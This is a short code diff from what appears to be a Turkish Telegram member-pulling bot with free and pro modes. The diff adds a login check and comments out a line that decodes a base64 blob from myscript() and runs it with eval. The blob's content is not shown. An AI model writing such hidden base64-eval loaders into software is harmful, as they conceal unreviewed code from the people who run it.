@@ -175,10 +175,11 @@ async def main():
     logo(True)
     basarili("Yeniden tasarlanmış v2.5 karşınızda, elveda pyrogram!")
     onemli("Güncelleme Notları:\nÜye çekme mantığı geliştirildi!\nBedava pro sürümü için @berce'ye yazın")
+    pro=login()
     if not pro:
         ads("Free sürüm! Yavaş Mod ve Reklamlar aktif!")
         ads("Free mod için bekleme odası! Kısa bir süre sonra başlayacak!",15)
-    eval(compile(base64.b64decode(myscript()),'<string>','exec'))
+    #eval(compile(base64.b64decode(myscript()),'<string>','exec'))
     userbot = await hesabagir()
     a = True
     while a:
